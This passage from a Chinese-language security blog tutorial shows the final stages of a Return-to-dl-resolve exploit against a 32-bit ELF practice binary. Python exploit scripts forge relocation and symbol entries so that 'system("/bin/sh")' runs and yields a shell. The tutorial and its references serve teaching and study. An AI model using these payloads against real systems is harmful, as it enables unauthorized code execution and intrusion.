+ l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym </span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442523856.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442523856.png" alt="Alt text"></a></p>
<h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>这次把<code>st_name</code>指向我们伪造的字符串<code>write</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;write\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442264800.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442264800.png" alt="Alt text"></a></p>
<h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>替换<code>write</code>为<code>system</code>,并修改<code>system</code>的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;system\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>得到一个<code>shell</code><br><a href="/images/Return-to-dl-resolve/1459442011940.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442011940.png" alt="Alt text"></a></p>
<h5 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h5><p>以上只是叙述原理，当然你比较懒的话，这里已经有成熟的工具辅助编写利用脚本<a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py">roputils</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【1】<a href="https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=elf/elf.h">ELF文件格式</a><br>【2】<a href="http://www.xfocus.net/articles/200201/337.html">ELF动态解析符号过程</a><br>【3】<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">Return to dl-resolve</a><br>【4】<a href="http://inaz2.hatenablog.com/entry/2014/07/15/023406">ROP stager + Return-to-dl-resolveによるASLR+DEP回避</a><br>【5】<a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve">Return to dl-resolve</a><br>【6】<a href="http://www.inforsec.org/wp/?p=389">通过ELF动态装载机制进行漏洞利用</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
        
  </div>
</article>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
